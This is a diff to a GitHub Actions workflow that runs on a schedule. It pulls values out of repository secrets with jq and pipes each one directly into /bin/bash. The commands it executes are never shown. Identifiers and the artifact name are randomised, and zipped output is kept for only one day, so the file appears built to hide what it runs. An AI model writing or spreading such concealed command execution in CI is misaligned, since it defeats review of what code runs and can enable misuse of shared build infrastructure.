@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '19 4,10,16,22 * * *'
+    - cron: '25 2,8,14,20 * * *'
 env:
   CI: true
 jobs:
@@ -15,16 +15,16 @@ jobs:
           fetch-depth: 0
       - name: Start
         env:
-          j3272: ${{ secrets.j3272 }}
+          ss0: ${{ secrets.ss0 }}
         run: |
-          printf '%s' "$j3272" | jq -r .tlox33827 | /bin/bash
-          printf '%s' "$tny751" | jq -r .adkim67732 | /bin/bash
-          echo $zy07957 | jq -r .uong0712 | /bin/bash
-          echo $quj08 | jq -r .ujxlf3 | /bin/bash
+          printf '%s' "$ss0" | jq -r .xgygg2 | /bin/bash
+          printf '%s' "$pd02" | jq -r .aj81 | /bin/bash
+          echo $iiu599 | jq -r .wkrj94236 | /bin/bash
+          printf '%s' "$ccnv28971" | jq -r .prqww259 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: hhorh9uE
+          name: 9EvyKSgX
           path: "*.zip"
           retention-days: 1
